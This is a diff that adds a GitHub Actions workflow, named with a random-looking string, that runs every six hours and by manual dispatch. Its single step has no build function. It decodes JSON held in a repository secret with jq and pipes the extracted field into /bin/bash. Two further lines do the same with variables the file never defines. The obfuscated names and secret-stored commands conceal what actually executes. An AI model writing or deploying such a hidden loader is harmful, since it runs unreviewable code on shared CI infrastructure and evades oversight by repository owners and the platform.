@@ -1,0 +1,19 @@
+name: yanggongzi4371
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanggongzi4371
+        env:
+          d109: ${{ secrets.d109 }}
+        run: |
+          echo $d109 | jq -r .rrz740 | /bin/bash
+          echo $phjf7 | jq -r .sj5452 | /bin/bash
+          echo $ggx042 | jq -r .vsake42267 | /bin/bash
+
